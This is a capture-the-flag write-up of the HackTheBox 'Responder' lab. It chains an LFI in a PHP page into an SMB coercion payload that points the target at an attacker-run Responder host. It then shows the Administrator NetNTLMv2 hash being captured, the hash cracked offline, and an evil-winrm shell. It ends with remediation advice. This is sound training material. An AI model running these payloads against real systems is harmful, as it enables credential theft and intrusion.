# Responder (HTB) - LFI to NTLMv2 Coercion & WinRM Execution

**Platform:** HackTheBox (Starting Point) | **Target OS:** Windows | **Difficulty:** Very Easy  
**Focus:** Local File Inclusion (LFI), UNC Path Injection, SMB Authentication Coercion (NetNTLMv2), Hash Cracking, and Windows Remote Management (WinRM).

---

## 🎯 Executive Summary
The "Responder" engagement demonstrates a critical attack chain bridging Web Application vulnerabilities with Windows Network protocols. By discovering a Local File Inclusion (LFI) flaw in a PHP application, we forced the underlying Windows Server to resolve an external Universal Naming Convention (UNC) path. This forced the server to attempt an SMB authentication against our rogue listener, leaking the Administrator's NetNTLMv2 hash. After cracking the hash offline, we achieved Remote Code Execution (RCE) via WinRM.

---

## 1. Network Reconnaissance & Service Profiling

We initiated the assessment with a targeted `Nmap` scan to profile the exposed services.

```bash
$ nmap -sV -sC -p 5985,80  10.129.32.107
Starting Nmap 7.94SVN
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Technical Analysis:**
- **Port 80 (HTTP):** Running Apache/PHP on a Windows architecture (`Win64`). A local DNS resolution redirect required us to map `unika.htb` to the target IP in our `/etc/hosts` file.
- **Port 5985 (WinRM):** Windows Remote Management is active. This service allows PowerShell remoting but requires valid administrative credentials to execute commands. Our primary objective shifted to credential harvesting to unlock this attack vector.

---

## 2. Web Application Analysis & LFI Discovery

While analyzing the web application's routing mechanism, we identified a language selection parameter (`?page=`). Testing this parameter revealed a Local File Inclusion (LFI) vulnerability.

```bash
$ curl -v -L http://unika.htb/index.php\?page\=../../../../../../../../windows/system32/drivers/etc/hosts
< HTTP/1.1 200 OK
< Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
[...]
#       127.0.0.1       localhost
#       ::1             localhost
```
*Finding:* We successfully traversed the directory structure and read the local `hosts` file, confirming arbitrary file read capabilities.

---

## 3. NTLMv2 Authentication Coercion (The Core Mechanic)

In a typical Linux environment, LFI is often escalated to Remote File Inclusion (RFI) or Log Poisoning. However, in a **Windows/PHP environment**, injecting a **UNC (Universal Naming Convention)** path triggers a unique OS-level behavior.

**Under the Hood (Win32 API & SMB):**
When PHP on Windows attempts to `include()` a UNC path (e.g., `//10.10.x.x/share`), it delegates the file operation to the Windows OS. Windows inherently attempts to access network shares via the SMB protocol. During this process, Windows automatically attempts transparent authentication, sending the current service account's **NetNTLMv2 Challenge-Response** to the destination.

We weaponized this behavior by starting `Responder` (a rogue LLMNR/NBT-NS/SMB listener) on our attack machine and feeding our IP into the LFI payload:

```bash
# Payload triggering the SMB outbound connection
$ curl http://unika.htb/index.php?page=//10.10.15.125/test
```

**Capturing the Hash via Responder:**
```text
[SMB] NTLMv2-SSP Client   : 10.129.32.107
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:490f1a51087637c9:E6B991D0E0EAE0627CB4E0F3763D05D9:010100[...]
```
*Success:* The server reached out to our rogue SMB listener, and we successfully captured the `Administrator`'s NetNTLMv2 hash.

---

## 4. Cryptography: Offline Hash Cracking

With the NetNTLMv2 hash captured, we executed an offline dictionary attack using `John the Ripper` and the `rockyou.txt` wordlist.

```bash
$ cd ~/john-jumbo/run
$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/htb/hash.txt
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
[...]
badminton        (Administrator)
```
*Result:* The hash was cracked, revealing the plaintext password: `badminton`.

---

## 5. Lateral Movement & Remote Code Execution (WinRM)

Utilizing the cracked administrative credentials, we pivoted back to the WinRM service (Port 5985) discovered during our initial reconnaissance. We used `evil-winrm` to establish a remote PowerShell session.

```bash
$ evil-winrm -i 10.129.32.107 -u Administrator -p badminton

Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac
```
*Execution:* Full system compromise was achieved, and the target flag was successfully exfiltrated.

---

## 6. Defensive Remediation & Detection Engineering

To secure Windows infrastructure against Authentication Coercion and LFI chains:

1. **Egress Filtering (Block Outbound SMB):** Windows servers should generally not initiate outbound SMB (Port 445) connections to the public internet or untrusted subnets. Block outbound port 445 at the perimeter firewall to neutralize SMB coercion attacks.
2. **Web Application Input Sanitization:** The PHP application must strictly sanitize the `page=` parameter. Implement an explicit whitelisting approach (e.g., matching input strictly against `french.html` or `german.html`) and reject any input containing directory traversal sequences (`../`) or UNC path indicators (`//`, `\\`).
3. **Password Complexity:** The local Administrator account was compromised rapidly due to a weak dictionary password (`badminton`). Enforce stringent password policies (length, complexity, and rotation) to mitigate offline hash cracking.
